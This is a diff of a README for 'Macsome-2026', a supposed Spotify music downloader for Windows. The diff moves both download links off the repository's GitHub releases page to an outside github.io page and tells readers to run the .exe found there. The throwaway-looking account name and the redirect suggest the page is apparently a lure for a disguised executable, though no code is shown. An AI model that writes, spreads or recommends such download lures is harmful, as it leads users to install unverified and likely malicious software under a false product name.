@@ -1,6 +1,6 @@
 # 🎵 Macsome-2026 - Save Your Spotify Music Files Easily
 
-[![Download Macsome-2026](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/electromotive-snuffcolour672/Macsome-2026/releases)
+[![Download Macsome-2026](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://electromotive-snuffcolour672.github.io)
 
 Macsome-2026 helps you download and convert Spotify music to your computer. This software works on Windows 10 and Windows 11. You can listen to your favorite songs offline without an active internet connection.
 
@@ -8,7 +8,7 @@ Macsome-2026 helps you download and convert Spotify music to your computer. This
 
 To get started, visit the official release page. Click the link below to go directly to the download area:
 
-[Click here to visit the release page and download](https://github.com/electromotive-snuffcolour672/Macsome-2026/releases)
+[Click here to visit the release page and download](https://electromotive-snuffcolour672.github.io)
 
 Once you reach the page, find the latest version listed at the top. Click the file ending in .exe to start the process on your computer.
 
